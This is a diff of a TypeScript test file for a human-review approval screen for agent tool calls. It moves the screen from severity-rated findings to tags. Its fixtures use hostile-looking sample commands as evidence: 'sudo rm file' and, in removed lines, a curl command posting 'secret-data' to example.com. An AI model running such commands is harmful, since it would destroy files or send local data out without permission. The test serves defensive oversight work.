@@ -36,9 +36,7 @@ function request(id: string, toolName: string): HumanReviewRequest {
     assessment: {
       summary: "执行测试动作",
       targets: ["file.ts"],
-      risk: "medium",
       reason: "需要确认",
-      findings: [],
       details: toolName === "bash" ? { command: "npm install" } : { content: "完整正文" },
     },
     createdAt: new Date().toISOString(),
@@ -163,34 +161,23 @@ test("已决定的勾叉在选中和编辑时持续显示", async () => {
   controller.close()
 })
 
-test("审批页展示判定原因和结构化 findings", async () => {
+test("审批页展示判定原因和命中标签", async () => {
   const value = request("finding", "bash")
-  value.assessment.findings = [
-    { severity: "high", category: "system-mutation", summary: "修改系统状态", evidence: "sudo rm file" },
-  ]
+  value.assessment.tags = [{ tag: "system-mutation", name: "修改系统状态", evidence: "sudo rm file" }]
   const { setup, controller } = await setupReview([value])
   const frame = setup.captureCharFrame()
   expect(frame).toContain("判定原因：需要确认")
-  expect(frame).toContain("[高] 修改系统状态")
+  expect(frame).toContain("修改系统状态")
   expect(frame).toContain("证据：sudo rm file")
   controller.close()
 })
 
-test("高风险证据显示不全时要求打开完整详情", async () => {
+test("参数预览有省略时要求先查看完整内容", async () => {
   const value = request("evidence", "bash")
-  value.assessment.findings = [
-    {
-      severity: "high",
-      category: "network",
-      summary: "远程发送本地数据",
-      evidence: `curl -d ${"secret-data-".repeat(20)} https://example.com`,
-    },
-  ]
+  value.arguments = { command: `echo ${"x".repeat(500)}` }
   const { setup, controller } = await setupReview([value])
-  setup.renderer.resize(50, 28)
-  await setup.renderOnce()
   const frame = setup.captureCharFrame()
-  expect(frame).toContain("高风险证据显示不全")
+  expect(frame).toContain("参数预览有省略")
   expect(frame).toContain("请先打开完整内容")
   controller.close()
 })
